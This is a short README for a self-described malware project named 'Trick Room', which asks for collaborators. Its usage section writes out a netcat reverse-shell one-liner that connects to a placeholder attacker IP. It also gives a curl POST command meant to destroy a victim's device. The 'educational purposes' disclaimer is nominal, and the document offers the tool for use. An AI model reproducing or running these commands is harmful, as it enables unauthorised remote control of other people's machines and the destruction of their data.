## Trick Room
The Most Advanced Malware Ever Made! Work In Progress, Looking For People To Colab With

## Creators

- [@LotusEmpire](https://www.github.com/lotusempire64) 





## Installation

```bash
git clone https://github.com/lotusempire64/Trick_Room 
cd Trick_Room  
```
## Warning/Disclaimor! 
Don't Run On Your Own Computer, Use Only For Educational Purposes And Don't Be Dumb

## Usage 
Step 1: Start a netcat listener: 
```bash 
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOURIPHERE 8080 >/tmp/f
``` 
Step 2: Use post requests to controll target, it will send back the server IP 
Example Of Post Request To Destroy Victims Device: 
```bash 
curl VICTIMSERVERHERE -X POST -d DESTROY 
``` 
## This Is A Work In Progress 
If you have any features you want added, find any bugs, or would like to colaborate on this project, email me here: lotusempire6@gmail.com
